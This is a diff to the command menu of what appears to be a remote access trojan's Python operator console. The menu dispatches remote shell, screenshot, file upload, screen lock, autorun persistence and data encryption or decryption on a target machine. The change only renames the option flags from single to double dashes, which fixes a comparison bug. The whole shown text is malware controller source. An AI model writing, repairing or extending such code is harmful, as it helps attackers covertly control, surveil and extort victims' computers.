@@ -255,25 +255,25 @@ def send_commands():
     while True:
         strChoice = input("\n" + "Type Selection: ")
 
-        if strChoice[:3] == "-m" and len(strChoice) > 3:
+        if strChoice[:3] == "--m" and len(strChoice) > 3:
             message = "msg" + strChoice[4:]
             send(str.encode(message))
-        elif strChoice[:3] == "-w" and len(strChoice) > 3:
+        elif strChoice[:3] == "--w" and len(strChoice) > 3:
             site = "site" + strChoice[4:]
             send(str.encode(site))
-        elif strChoice[:3] == "-p":
+        elif strChoice[:3] == "--p":
             screenshot()
-        elif strChoice[:3] == "-l":
+        elif strChoice[:3] == "--l":
             send(str.encode("lock"))
-        elif strChoice[:3] == "-c":
+        elif strChoice[:3] == "--c":
             command_shell()
-        elif strChoice[:3] == "-f" and len(strChoice) > 3:
+        elif strChoice[:3] == "--f" and len(strChoice) > 3:
             uploadFile(strChoice[4:])
-        elif strChoice[:3] == "-a":
+        elif strChoice[:3] == "--a":
             autorun()
-        elif strChoice[:5] == "-enc" and len(strChoice) > 5:
+        elif strChoice[:5] == "--enc" and len(strChoice) > 5:
             encrypt_data(strChoice[6:])
-        elif strChoice[:5] == "-dec" and len(strChoice) > 5:
+        elif strChoice[:5] == "--dec" and len(strChoice) > 5:
             decrypt_data(strChoice[6:])
         elif strChoice[:4] == "exit":
             return;
